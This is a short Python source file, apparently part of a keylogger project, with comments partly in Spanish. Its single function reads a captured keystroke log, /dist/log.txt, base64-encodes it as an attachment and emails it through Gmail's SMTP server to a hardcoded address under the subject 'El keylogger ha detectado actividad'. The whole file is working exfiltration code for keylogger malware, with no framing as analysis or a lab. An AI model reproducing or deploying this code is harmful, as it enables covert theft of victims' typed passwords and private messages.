import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from dotenv import load_dotenv
import os
from email.mime.base import MIMEBase
from email import encoders

def enviarCorreo():

    load_dotenv()

    # Email configuration
    sender_email = 'pruebasinformaticascaracas@gmail.com'
    receiver_email = 'pruebasinformaticascaracas@gmail.com'
    subject = 'El keylogger ha detectado actividad'
    message = 'En el archivo adjunto esta lo que el keylogger ha detectado:'
    ruta_adjunto = '/dist/log.txt'
    nombre_adjunto = '/dist/log.txt'

    # Create a multipart message object
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject


    # Attach the message to the email
    msg.attach(MIMEText(message, 'plain'))

    # Open attached file
    archivo_adjunto = open(ruta_adjunto, 'rb')

    adjunto_MIME = MIMEBase('application', 'octet-stream')
    # Y le cargamos el archivo adjunto
    adjunto_MIME.set_payload((archivo_adjunto).read())
    # Codificamos el objeto en BASE64
    encoders.encode_base64(adjunto_MIME)
    # Agregamos una cabecera al objeto
    adjunto_MIME.add_header('Content-Disposition', "attachment; filename= %s" % nombre_adjunto)
    # Y finalmente lo agregamos al mensaje
    msg.attach(adjunto_MIME)

    # SMTP server configuration
    smtp_server = 'smtp.gmail.com'
    #smtp_server = "smtp-mail.outlook.com"
    smtp_port = 587
    smtp_username = os.getenv('smtp_username')
    smtp_password = os.getenv('smtp_password')

    # Create a SMTP session
    with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.starttls()  
        server.login(smtp_username, smtp_password)  
        server.sendmail(sender_email, receiver_email, msg.as_string()) 
        print('Email sent successfully.')